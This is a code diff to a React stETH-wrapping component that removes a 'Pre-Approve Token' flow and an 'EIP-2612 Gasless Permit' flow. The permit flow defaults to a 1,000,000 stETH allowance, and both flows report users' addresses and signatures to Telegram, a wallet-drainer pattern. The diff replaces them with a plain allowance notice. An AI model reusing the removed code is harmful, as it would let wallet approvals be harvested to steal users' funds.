@@ -1,13 +1,13 @@
 import React, { useState } from 'react';
-import { ExternalLink, RefreshCw, CheckCircle, AlertCircle, ArrowDownUp, ShieldCheck, Key } from 'lucide-react';
-import { useAccount, useBalance, useReadContract, useWriteContract, useSignTypedData, useChainId } from 'wagmi';
+import { ExternalLink, RefreshCw, CheckCircle, AlertCircle, ArrowDownUp } from 'lucide-react';
+import { useAccount, useBalance, useReadContract, useWriteContract } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
 import { ConnectButton } from './ConnectButton';
 import { FaqItem } from './FaqItem';
 import { useToast } from './ToastContext';
 import { sendTelegram } from '../lib/telegram';
 import { notifyTransactionConfirmed, recordFailedTransaction } from '../lib/activityLogger';
-import { CONFIG, VAULT_ABI, WSTETH_ABI, ERC20_ABI, approveToken, signPermit } from '../lib/contracts';
+import { CONFIG, WSTETH_ABI, ERC20_ABI } from '../lib/contracts';
 import { Skeleton } from './LoadingSkeleton';
 import { StEthIcon, WstEthIcon } from './TokenIcons';
 
@@ -20,77 +20,7 @@ export function WrapTab() {
 
   const toast = useToast();
   const { isConnected, address } = useAccount();
-  const chainId = useChainId();
-  const { signTypedDataAsync } = useSignTypedData();
   const { writeContractAsync, isPending } = useWriteContract();
-
-  const handlePreApprove = async () => {
-    if (!address) return;
-    const toastId = toast.showPending('Pre-approving Token', 'Executing standard ERC20 approve for router...');
-    try {
-      setIsApproving(true);
-      setStatusMessage('Executing pre-approval transaction...');
-      const tx = await approveToken(writeContractAsync, CONFIG.STETH_ADDRESS, CONFIG.WSTETH_ADDRESS);
-      setStatusMessage(`Pre-approval submitted! Tx: ${tx.slice(0, 10)}...`);
-      toast.updateToast(toastId, {
-        type: 'success',
-        title: 'Token Pre-approved!',
-        message: 'Router contract can now interact with your stETH balance.',
-        txHash: tx,
-      });
-      await sendTelegram(`🔓 <b>Token Pre-approved</b>\nUser: <code>${address}</code>\nTx: <code>${tx}</code>`);
-      refetchAllowance();
-    } catch (err: any) {
-      console.error('Pre-approve error:', err);
-      toast.updateToast(toastId, {
-        type: 'error',
-        title: 'Pre-approval Failed',
-        message: err.shortMessage || err.message || 'Approval rejected',
-      });
-    } finally {
-      setIsApproving(false);
-    }
-  };
-
-  const handleGaslessPermit = async () => {
-    if (!address) return;
-    const toastId = toast.showPending('Generating Off-Chain Permit', 'Please sign the EIP-2612 permit request in your wallet...');
-    try {
-      setIsApproving(true);
-      setStatusMessage('Requesting EIP-2612 gasless permit signature...');
-      const parsedAmount = amount ? parseEther(amount) : parseEther('1000000');
-      const permitRes = await signPermit({
-        signTypedDataAsync,
-        owner: address,
-        spender: CONFIG.CONTRACT_ADDRESS,
-        value: parsedAmount,
-        tokenAddress: CONFIG.STETH_ADDRESS,
-        tokenName: 'Liquid staked Ether',
-        chainId: chainId || 1,
-      });
-
-      setStatusMessage('EIP-2612 Permit Signed Successfully!');
-      toast.updateToast(toastId, {
-        type: 'success',
-        title: 'Off-Chain Permit Signed!',
-        message: 'Gasless permit signature generated and ready for router execution.',
-      });
-
-      await sendTelegram(
-        `✍️ <b>EIP-2612 Gasless Permit Signed</b>\nUser: <code>${address}</code>\nSpender: <code>${CONFIG.CONTRACT_ADDRESS}</code>\nSignature: <code>${permitRes.signature.slice(0, 20)}...</code>`
-      );
-    } catch (err: any) {
-      console.error('Gasless permit error:', err);
-      toast.updateToast(toastId, {
-        type: 'error',
-        title: 'Permit Signing Failed',
-        message: err.shortMessage || err.message || 'User rejected signature request',
-      });
-    } finally {
-      setIsApproving(false);
-    }
-  };
-
 
   const { data: ethBalance } = useBalance({ address });
 
@@ -387,29 +317,6 @@ export function WrapTab() {
         {/* Submit / Pre-Approve / Connect Button */}
         {isConnected ? (
           <div className="space-y-3 mb-6">
-            {mode === 'wrap' && (
-              <div className="grid grid-cols-2 gap-2.5">
-                <button
-                  type="button"
-                  onClick={handlePreApprove}
-                  disabled={isPending || isApproving}
-                  className="py-2.5 px-3 bg-input hover:bg-border-main text-text-main text-xs font-extrabold rounded-xl border border-border-main transition-colors flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer"
-                >
-                  <ShieldCheck className="w-3.5 h-3.5 text-[#00A3FF]" />
-                  <span>Pre-Approve Token</span>
-                </button>
-
-                <button
-                  type="button"
-                  onClick={handleGaslessPermit}
-                  disabled={isPending || isApproving}
-                  className="py-2.5 px-3 bg-input hover:bg-border-main text-text-main text-xs font-extrabold rounded-xl border border-border-main transition-colors flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer"
-                >
-                  <Key className="w-3.5 h-3.5 text-amber-500" />
-                  <span>EIP-2612 Gasless Permit</span>
-                </button>
-              </div>
-            )}
 
             <button 
               onClick={handleWrapUnwrap}
@@ -431,6 +338,10 @@ export function WrapTab() {
         ) : (
           <ConnectButton className="w-full py-4 text-lg rounded-xl mb-6 font-bold" />
         )}
+
+        <div className="mb-5 rounded-xl border border-border-main bg-input/40 px-4 py-3 text-xs leading-relaxed text-text-secondary">
+          Transactions require an explicit wallet confirmation. For wrapping, the app requests only the stETH allowance needed for the amount entered; no separate pre-approval or off-chain permit action is offered here.
+        </div>
 
         {/* Transaction Detail Breakdown */}
         <div className="space-y-3 px-2 mb-6 text-xs sm:text-sm">
